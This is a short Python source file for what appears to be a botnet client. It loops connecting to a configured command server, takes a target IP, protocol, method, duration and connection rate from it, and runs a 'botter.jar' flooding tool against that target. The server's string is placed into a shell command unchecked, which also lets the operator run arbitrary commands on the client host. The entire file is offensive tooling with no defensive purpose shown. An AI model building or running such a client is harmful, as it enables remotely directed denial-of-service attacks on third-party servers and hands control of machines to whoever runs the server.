# client

# this is the code before the impl of qchecker

import socket
import subprocess
from json import loads, dumps

import proxy_scraper



try:
    with open("config.json", "r") as f:
        config = loads(f.read())
    client_name = config["client_name"]
    server_host = config["server_host"]
    server_port = config["server_port"]

except:
    client_name = input("Enter client name : ")
    server_host, server_port = input("Enter server ip:port :").split(":")
    with open("config.json", "w") as f:
        f.write(dumps({"client_name": client_name, "server_host": server_host, "server_port": server_port}))


def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = client_socket.connect_ex((server_host, int(server_port)))

    if result:
        return
    print(f"Connected to the server at {server_host}:{server_port}")
    client_socket.send(client_name.encode('utf-8'))

    target_ip, protocol, method, seconds, cps = client_socket.recv(1024).decode('utf-8').split("??<><>")
    command = f"java -jar botter.jar {target_ip} {protocol} {method} {seconds} {cps}"
    print(command)
    subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    client_socket.send("!!".encode('utf-8'))


def main():
    print("Scraping proxies")
    proxy_scraper.main()
    print("Finished scraping")
    while True:
        connect_to_server()


main()
